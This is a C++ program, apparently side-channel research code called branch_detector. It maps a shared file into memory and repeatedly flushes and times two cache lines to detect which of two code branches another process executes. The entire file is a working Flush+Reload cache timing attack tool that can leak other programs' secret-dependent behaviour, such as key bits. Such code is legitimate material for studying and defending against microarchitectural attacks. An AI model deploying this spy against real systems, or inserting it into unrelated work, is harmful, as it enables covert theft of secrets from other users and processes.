#include <iostream>
#include <cstdlib>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include "../main/utils/cacheutils.h"
#include "../main/utils/intel.h"

const size_t LIMIT = 100;

char *get_file(char *path)
{
    uint offset = 0;
    int fd = open(path, O_RDONLY);

    if (fd < 3)
        return nullptr;
    char *addr = (char *)mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void *)-1)
        return nullptr;
    return addr;
}

int main(int argc, char *argv[])
{
    if (argc < 4)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }

    char *path = argv[1];
    int addr0 = std::strtol(argv[2], nullptr, 16);
    int addr1 = std::strtol(argv[3], nullptr, 16);

    if (addr0 <= 0 || addr1 <= 0)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }

    char *base_addr = get_file(argv[1]);

    uint total0 = 0;
    uint total1 = 0;
    while (true)
    {
        flush(base_addr + addr1);
        int result1 = probe_timing(base_addr + addr1);
        flush(base_addr + addr0);
        int result0 = probe_timing(base_addr + addr0);

        if (result0 <= LIMIT)
        {
            total0++;
            std::cout << "Case 0 triggered with " << result0 << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
        }
        if (result1 <= LIMIT)
        {
            total1++;
            std::cout << "Case 1 triggered with " << result1 << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
        }
    }

    return 0;
}
